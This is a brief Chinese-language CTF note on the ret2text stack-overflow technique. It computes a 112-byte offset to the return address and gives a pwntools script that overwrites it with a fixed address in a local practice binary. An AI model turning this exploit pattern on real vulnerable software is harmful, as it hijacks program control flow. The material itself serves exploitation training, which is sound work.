# pwn



# 栈溢出原理





# ret2text



综上 100字节数组 + 浪费8字节 + 4字节存储寄存器 = 112字节，从s数组距离函数返回地址距离112字节，首先gets输入时，首先填充112字节，在填充4字节返回地址到需要运行的函数



payload

```python
target = 0x0804863A #我们需要操控函数的目标地址
payload = b'A' * 100 + b'B' * 8 + b'C' * 4  + p32(target)  #构造payload攻击载荷
```



完整代码

```python
from pwn import *

sh = process('./ret2text')
target = 0x0804863A
payload = b'A' * 100 + b'B' * 8 + b'C' * 4  + p32(target)
sh.sendline(payload)
sh.interactive()
```

